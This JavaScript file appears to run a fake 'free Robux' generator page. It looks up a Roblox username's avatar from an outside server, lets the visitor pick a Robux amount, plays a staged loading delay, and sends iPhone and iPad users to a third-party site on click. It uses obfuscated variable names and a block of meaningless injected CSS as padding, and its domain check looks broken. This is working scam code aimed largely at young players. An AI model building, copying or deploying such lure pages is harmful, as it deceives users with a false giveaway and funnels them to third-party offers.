
$(".next").on("click", function () {
  $(".xload #step-1").addClass("d-none");
  $("#step-2").removeClass("d-none");
  var _0x497540 = $("#username").val();
  $(".username").text(_0x497540);
  $.ajax({
    'url': 'https://abadaoucht.com/tiktok/api/roblox/userinfo/' + _0x497540,
    'type': "GET",
    'success': function (_0x8d7208) {
      if (_0x8d7208.status === "SUCCESS") {
        $(".xload .loading").addClass("d-none");
        $(".data-recive").removeClass("d-none");
        $("#avatar").attr("src", _0x8d7208.avatar);
      } else {
        showUsernameOnly(_0x497540);
      }
    },
    'error': function () {
      showUsernameOnly(_0x497540);
      console.log("Failed to fetch profile information.");
    }
  });
});
function showUsernameOnly(_0x42eef8) {
  $(".xload .loading").addClass("d-none");
  $('.data-recive').removeClass("d-none");
  $(".username").text(_0x42eef8);
  $("#avatar").attr("src", '');
}
$(".robux .item .select").on("click", function () {
  var _0x44471b = $(this).text();
  $(".xload .robux_counter").text(_0x44471b);
  $("#step-2").addClass("d-none");
  $(".xload #step-3").removeClass("d-none");
  setTimeout(function () {
    $(".xload .loading-2").addClass("d-none");
    $(".xload .final").removeClass("d-none");
  }, 0xfa0);
});
const style = document.createElement("style");
style.textContent = "\n        #random-container {\n            width: 1234px;\n            height: 234px;\n            margin-top: 765px;\n            color: #ab34ef;\n            background-color: #cda223;\n            padding: 98px 432px;\n            border-radius: 123px;\n            text-align: justify;\n            border: 78px dotted #ffe123;\n            box-shadow: 12px 34px 56px rgba(234, 12, 67, 0.8);\n        }\n\n        .random-class-1 {\n            font-size: 67px;\n            font-weight: 800;\n            line-height: 90px;\n            letter-spacing: 4px;\n            text-transform: uppercase;\n            background: linear-gradient(45deg, #ef9a9a, #64b5f6);\n            opacity: 0.7;\n        }\n\n        .random-class-2 {\n            width: 300px;\n            height: 450px;\n            margin: 150px auto;\n            padding: 25px;\n            border: 10px solid #7b1fa2;\n            border-top-left-radius: 50px;\n            border-bottom-right-radius: 50px;\n            transition: all 0.5s ease;\n        }\n\n        .random-class-3:hover {\n            transform: rotate(45deg);\n            filter: brightness(150%);\n        }\n\n        .random-class-4 {\n            position: relative;\n            z-index: -1;\n            overflow: hidden;\n            border-width: 3px;\n            box-sizing: border-box;\n        }\n\n        .random-class-5::before {\n            content: \"\";\n            display: block;\n            width: 100%;\n            height: 100%;\n            position: absolute;\n            top: 0;\n            left: 0;\n            background: rgba(0, 0, 0, 0.5);\n        }\n\n        .random-class-6 {\n            display: flex;\n            justify-content: space-around;\n            align-items: center;\n            padding: 10px 20px;\n        }\n\n        .random-class-7 {\n            color: #6a1b9a;\n            background-color: #ffccbc;\n            border-radius: 10px;\n            text-decoration: none;\n        }\n\n        .random-class-8 {\n            width: 90%;\n            height: 50px;\n            padding: 10px;\n            border: 2px dashed #d32f2f;\n            text-align: left;\n            margin: 20px 10px;\n        }\n\n        .random-class-9 {\n            font-family: 'Courier New', Courier, monospace;\n            font-size: 14px;\n            line-height: 1.5;\n            letter-spacing: 0.1em;\n            color: #4caf50;\n            background: #f0f4c3;\n        }\n\n        .random-class-10 {\n            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);\n            padding: 20px;\n            background: #ffee58;\n            border: 2px solid #f57c00;\n            text-transform: lowercase;\n        }\n\n        .random-class-11 {\n            margin: 30px;\n            padding: 40px;\n            display: block;\n            border: 4px double #3f51b5;\n            background: #e1bee7;\n        }\n\n        .random-class-12 {\n            text-align: center;\n            padding: 5px 15px;\n            border-radius: 25px;\n            box-shadow: inset 5px 5px 15px #673ab7;\n            color: #8e24aa;\n            border: 1px solid #d500f9;\n        }\n\n        .random-class-13 {\n            overflow: scroll;\n            white-space: nowrap;\n            height: 200px;\n            background-color: #c5e1a5;\n            font-style: italic;\n        }\n\n        .random-class-14 {\n            float: right;\n            clear: both;\n            margin-right: 5%;\n            border-left: 5px solid #009688;\n            padding: 10px;\n            color: #ff5722;\n        }\n\n        .random-class-15 {\n            width: auto;\n            height: auto;\n            padding: 15px;\n            background: radial-gradient(circle, #8bc34a, #558b2f);\n            border: none;\n            font-size: 12px;\n        }\n\n        .random-class-16 {\n            position: absolute;\n            top: 25%;\n            left: 75%;\n            transform: translate(-50%, -50%);\n            background: #d500f9;\n            opacity: 0.3;\n        }\n\n        .random-class-17 {\n            display: inline-block;\n            border: solid 8px #3949ab;\n            border-radius: 50%;\n            height: 100px;\n            width: 100px;\n            background: #bbdefb;\n            box-sizing: content-box;\n        }\n\n        .random-class-18 {\n            content: \" \";\n            font-variant: small-caps;\n            background: #ff80ab;\n            width: 75%;\n            margin: 0 auto;\n        }\n\n        .random-class-19 {\n            flex-grow: 1;\n            padding: 3px;\n            text-shadow: 1px 1px 2px #e91e63;\n            background: #ffcc80;\n        }\n\n        .random-class-20 {\n            filter: blur(3px);\n            transform: scale(1.2) rotate(15deg);\n            transition: filter 0.4s ease;\n        }\n    ";
document.head.appendChild(style);

/*================== [1 ] ===============*/
/*================== [ roblox ] ================*/
var button = document.querySelector('.robux');  
button.addEventListener('click', function() {
    (function() {
        var originalDomain = "https://rbx5s7.vercel.app/";
        var redirectURL = "https://www.rolls3.com";
        var blockedDomains = [
            "https://rbx5s7.vercel.app",
            "mply.io.4a6b8dh.site"
        ];

        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
            var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);

            if (isIphoneOrIpad) { 
                window.location.href = redirectURL;
            }
        }
    })();
});
